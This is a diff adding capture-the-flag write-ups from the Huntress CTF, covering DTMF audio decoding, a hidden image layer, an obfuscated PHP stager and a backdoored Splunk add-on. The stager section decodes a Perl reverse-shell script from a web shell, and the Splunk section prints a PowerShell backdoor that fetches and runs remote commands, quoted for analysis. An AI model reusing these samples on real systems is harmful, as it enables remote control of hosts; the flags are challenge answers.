@@ -687,3 +687,214 @@ Nmap done: 1 IP address (1 host up) scanned in 18.40 seconds
 root@kali:~/ctf/HuntressCTF# nc 155.138.162.158 8888 | grep -i flag
 flag{93671c2c38ee872508770361ace37b02}
 ```
+
+## Dialtone
+
+### Description
+
+> Well would you listen to those notes, that must be some long phone number or something!
+>
+> Download the file(s) below.
+>
+> Attachments: dialtone.wav
+
+### Flag
+
+flag{6c733ef09bc4f2a4313ff63087e25d67}
+
+### Solution
+
+Listening to the attached `dialtone.wav` file, it sounds DTMF code.
+To Decode it as DTMF code, [DTMF Decoder](https://dtmf.netlify.app/) or [DTMF detection demo](https://unframework.github.io/dtmf-detect/#/) are useful tools.
+
+Decoded it, I got `13040004482820197714705083053746380382743933853520408575731743622366387462228661894777288573`.
+Then, unhexlified it.
+
+```python
+>>> import binascii
+>>> binascii.unhexlify(hex(13040004482820197714705083053746380382743933853520408575731743622366387462228661894777288573)[2:])
+b'flag{6c733ef09bc4f2a4313ff63087e25d67}'
+```
+
+## PHP Stager
+
+### Description
+
+> Ugh, we found PHP set up as an autorun to stage some other weird shady stuff. Can you unravel the payload?
+>
+> Download the file(s) below.
+>
+> Attachments: phonetic
+
+### Flag
+
+flag{9b5c4313d12958354be6284fcd63dd26}
+
+### Solution
+
+```console
+root@kali:~/ctf/HuntressCTF# file phonetic
+phonetic: PHP script, ASCII text, with very long lines (65060)
+```
+
+The attached `phonetic` file is obfuscated PHP code.
+
+```console
+root@kali:~/ctf/HuntressCTF# cp phonetic phonetic-edited.php
+
+root@kali:~/ctf/HuntressCTF# vi phonetic-edited.php  # remove `$c = $k("/*XAjqgQvv4067*/", ` and `$c();`
+
+root@kali:~/ctf/HuntressCTF# diff phonetic phonetic-edited.php
+21,22c21
+< $c = $k("/*XAjqgQvv4067*/", $fsPwhnfn8423( deGRi($fsPwhnfn8423($gbaylYLd6204), "tVEwfwrN302")));
+< $c();
+---
+> echo $fsPwhnfn8423( deGRi($fsPwhnfn8423($gbaylYLd6204), "tVEwfwrN302"));
+26c25
+<
+\ No newline at end of file
+---
+>
+
+root@kali:~/ctf/HuntressCTF# php phonetic-edited.php > tmp1.php
+```
+
+tmp1.php is similar to the Web Shell [wso.php](https://github.com/wsjswy/Security/blob/master/machineLearning/data/PHP-WEBSHELL/IndoXploit/wso.php).
+
+```console
+root@kali:~/ctf/HuntressCTF# curl -sLO https://raw.githubusercontent.com/wsjswy/Security/master/machineLearning/data/PHP-WEBSHELL/IndoXploit/wso.php
+
+root@kali:~/ctf/HuntressCTF# diff tmp1.php wso.php | grep -i flag  # not found
+
+root@kali:~/ctf/HuntressCTF# diff tmp1.php wso.php
+(snip)
+1459c1462
+<       $back_connect_p="IyEvdXNyL2Jpbi9wZXJsCnVzZSBTb2NrZXQ7CiRpYWRkcj1pbmV0X2F0b24oJEFSR1ZbMF0pIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsKJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsKJHByb3RvPWdldHByb3RvYnluYW1lKCd0Y3AnKTsKc29ja2V0KFNPQ0tFVCwgUEZfSU5FVCwgU09DS19TVFJFQU0sICRwcm90bykgfHwgZGllKCJFcnJvcjogJCFcbiIpOwpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7Cm9wZW4oU1RESU4sICI+JlNPQ0tFVCIpOwpvcGVuKFNURE9VVCwgIj4mU09DS0VUIik7Cm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsKbXkgJHN0ciA9IDw8RU5EOwpiZWdpbiA2NDQgdXVlbmNvZGUudXUKRjlGUUE5V0xZOEM1Qy0jLFEsVjBRLENEVS4jLFUtJilFLUMoWC0mOUM5IzhTOSYwUi1HVGAKYAplbmQKRU5ECnN5c3RlbSgnL2Jpbi9zaCAtaSAtYyAiZWNobyAke3N0cmluZ307IGJhc2giJyk7CmNsb3NlKFNURElOKTsKY2xvc2UoU1RET1VUKTsKY2xvc2UoU1RERVJSKQ==";
+---
+>       $back_connect_p="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
+
+root@kali:~/ctf/HuntressCTF# echo -ne 'IyEvdXNyL2Jpbi9wZXJsCnVzZSBTb2NrZXQ7CiRpYWRkcj1pbmV0X2F0b24oJEFSR1ZbMF0pIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsKJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsKJHByb3RvPWdldHByb3RvYnluYW1lKCd0Y3AnKTsKc29ja2V0KFNPQ0tFVCwgUEZfSU5FVCwgU09DS19TVFJFQU0sICRwcm90bykgfHwgZGllKCJFcnJvcjogJCFcbiIpOwpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7Cm9wZW4oU1RESU4sICI+JlNPQ0tFVCIpOwpvcGVuKFNURE9VVCwgIj4mU09DS0VUIik7Cm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsKbXkgJHN0ciA9IDw8RU5EOwpiZWdpbiA2NDQgdXVlbmNvZGUudXUKRjlGUUE5V0xZOEM1Qy0jLFEsVjBRLENEVS4jLFUtJilFLUMoWC0mOUM5IzhTOSYwUi1HVGAKYAplbmQKRU5ECnN5c3RlbSgnL2Jpbi9zaCAtaSAtYyAiZWNobyAke3N0cmluZ307IGJhc2giJyk7CmNsb3NlKFNURElOKTsKY2xvc2UoU1RET1VUKTsKY2xvc2UoU1RERVJSKQ==' | base64 -d
+#!/usr/bin/perl
+use Socket;
+$iaddr=inet_aton($ARGV[0]) || die("Error: $!\n");
+$paddr=sockaddr_in($ARGV[1], $iaddr) || die("Error: $!\n");
+$proto=getprotobyname('tcp');
+socket(SOCKET, PF_INET, SOCK_STREAM, $proto) || die("Error: $!\n");
+connect(SOCKET, $paddr) || die("Error: $!\n");
+open(STDIN, ">&SOCKET");
+open(STDOUT, ">&SOCKET");
+open(STDERR, ">&SOCKET");
+my $str = <<END;
+begin 644 uuencode.uu
+F9FQA9WLY8C5C-#,Q,V0Q,CDU.#,U-&)E-C(X-&9C9#8S9&0R-GT`
+`
+end
+END
+system('/bin/sh -i -c "echo ${string}; bash"');
+close(STDIN);
+close(STDOUT);
+close(STDERR)
+
+root@kali:~/ctf/HuntressCTF# vi tmp.dat
+
+root@kali:~/ctf/HuntressCTF# cat tmp.dat
+begin 644 uuencode.uu
+F9FQA9WLY8C5C-#,Q,V0Q,CDU.#,U-&)E-C(X-&9C9#8S9&0R-GT`
+`
+end
+
+root@kali:~/ctf/HuntressCTF# file tmp.dat
+tmp.dat: uuencoded or xxencoded text, file name "uuencode.uu", ASCII text
+```
+
+uudecode it, got flag.
+
+```console
+root@kali:~/ctf/HuntressCTF# apt install sharutils
+(snip)
+root@kali:~/ctf/HuntressCTF# uudecode tmp.dat
+
+root@kali:~/ctf/HuntressCTF# cat uuencode.uu
+flag{9b5c4313d12958354be6284fcd63dd26}
+```
+
+- [Uuencode Command Linux](https://linuxhint.com/uuencode-command-linux/)
+- [cheat.sh/uudecode](https://cheat.sh/uudecode)
+
+## Layered Security
+
+### Description
+
+> It takes a team to do security right, so we have layered our defenses!
+>
+> Download the file(s) below.
+>
+> Attachments: layered_security
+
+### Flag
+
+flag{9a64bc4a390cb0ce31452820ee562c3f}
+
+### Solution
+
+```console
+$ file layered_security
+layered_security: GIMP XCF image data, version 011, 1024 x 1024, RGB Color
+```
+
+1. Open layered_security with GIMP
+2. Show `Pasted Layer #3` layer only, there is the flag in it.
+
+![layered_security.png](img/layered_security.png)
+
+## Backdoored Splunk
+
+### Description
+
+> You've probably seen Splunk being used for good, but have you seen it used for evil?
+>
+> NOTE: the focus of this challenge should be on the downloadable file below. It uses the dynamic service that is started, but you must put the puzzle pieces together to be retrieve the flag. The connection error to the container is part of the challenge.
+>
+> Download the file(s) below and press the Start button on the top-right to begin this challenge.
+>
+> Attachments: Splunk_TA_windows.zip
+
+### Flag
+
+flag{60bb3bfaf703e0fa36730ab70e115bd7}
+
+### Solution
+
+Splunk_TA_windows/bin/powershell/nt6-health.ps1
+
+```powershell
+# (snip)
+
+#
+# Windows Version and Build #
+#
+$WindowsInfo = Get-Item "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion"
+# $PORT below is dynamic to the running service of the `Start` button
+$OS = @($html = (Invoke-WebRequest http://chal.ctf.games:$PORT -Headers @{Authorization=("Basic YmFja2Rvb3I6dXNlX3RoaXNfdG9fYXV0aGVudGljYXRlX3dpdGhfdGhlX2RlcGxveWVkX2h0dHBfc2VydmVyCg==")} -UseBasicParsing).Content
+if ($html -match '<!--(.*?)-->') {
+    $value = $matches[1]
+    $command = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($value))
+    Invoke-Expression $command
+})
+
+# (snip)
+```
+
+Sending request with the above token.
+
+```console
+root@kali:~/ctf/HuntressCTF# curl -D- http://chal.ctf.games:31971 -H "Authorization: Basic YmFja2Rvb3I6dXNlX3RoaXNfdG9fYXV0aGVudGljYXRlX3dpdGhfdGhlX2RlcGxveWVkX2h0dHBfc2VydmVyCg=="
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 69
+
+<!-- ZWNobyBmbGFnezYwYmIzYmZhZjcwM2UwZmEzNjczMGFiNzBlMTE1YmQ3fQ== -->
+
+root@kali:~/ctf/HuntressCTF# echo -ne 'ZWNobyBmbGFnezYwYmIzYmZhZjcwM2UwZmEzNjczMGFiNzBlMTE1YmQ3fQ==' | base64 -d
+echo flag{60bb3bfaf703e0fa36730ab70e115bd7}
+```
